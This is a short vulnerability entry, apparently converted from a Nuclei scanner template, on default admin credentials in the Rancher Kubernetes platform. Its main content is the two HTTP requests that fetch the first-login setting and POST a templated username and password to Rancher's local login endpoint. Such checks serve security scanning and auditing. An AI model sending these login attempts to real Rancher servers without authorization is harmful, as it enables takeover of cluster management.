# Vulnerability: Rancher Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`rancher-default-login.yaml`)

## Description
Rancher default admin credentials were discovered. Rancher is an open-source multi-cluster orchestration platform that lets operations teams deploy, manage and secure enterprise Kubernetes.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /v3/settings/first-login HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36

POST /v3-public/localProviders/local?action=login HTTP/1.1
Host: {{Hostname}}
Cookie: CSRF={{csrf}}
X-Api-Csrf: {{csrf}}
Connection: close
Content-Length: 136

{"username":"{{username}}","password":"{{password}}","description":"UI Session","responseType":"cookie","labels":{"ui-session":"true"}}
```

